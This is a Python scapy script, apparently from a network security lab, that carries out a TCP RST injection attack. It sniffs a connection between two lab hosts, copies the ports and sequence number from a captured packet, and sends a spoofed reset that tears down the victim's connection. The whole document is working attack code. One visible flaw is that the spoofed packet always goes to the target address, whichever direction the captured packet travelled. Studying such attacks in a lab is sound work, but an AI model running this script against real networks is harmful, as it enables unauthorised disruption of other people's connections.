"""
This script demonstrates a TCP RST attack by hijacking a connection between two other parties.
It must sniff their traffic and create a RST packet that impersonates one of the parties.

This is not a volumetric attack, it targets a single active connection.
To have the RST accepted by the target, the sequence number needs to be within the expected window,
which is why we sniff the traffic first to make the best estimate.

In the lab:
testing-security (192.168.168.12) makes a real connection to testing-target (192.168.168.10)

testing-attacker sniffs the connection and sends a RST packet that kills the connection

"""

from scapy.all import TCP, IP, send, sniff

# Config information:
target_ip = "192.168.168.10" # testing-target
client_ip = "192.168.168.12" # testing_security (acting as our client in this case)

# first we need to packet sniff
def packet_sniff():
    print(f"Sniffing traffic between {client_ip} and {target_ip}..")

    # sniff() uses count, filter, iface, lfilter, prn, timeout

    # we create our filter first (BPF syntax):
    sniff_filter = f"tcp and host {client_ip} and host {target_ip}"
    packets = sniff(sniff_filter, count=5, timeout=30)

    # we'll have a quick check to see if packets are being captured"
    if len(packets) == 0:
        print("No packets captured. Check testing-security is generating traffic.")
        return None
    
    
    return packets[0]

def create_rst(captured_packet):
    src_ip = captured_packet[IP].src
    src_port = captured_packet[TCP].sport
    dst_port = captured_packet[TCP].dport
    real_seq = captured_packet[TCP].seq

    print(f"Captured from {src_ip}:{src_port} to {target_ip}:{dst_port}, seq={real_seq}")

    rst_packet = IP(src=src_ip, dst=target_ip)/TCP(
        sport=src_port,
        dport=dst_port,
        flags="R",
        seq=real_seq
    )

    return rst_packet


def main():

    captured_packet = packet_sniff()

    if captured_packet is None:
        return
    
    rst_packet = create_rst(captured_packet)
    send(rst_packet, verbose=0)
    print("TCP RST sent.")


if __name__ == "__main__":
    main()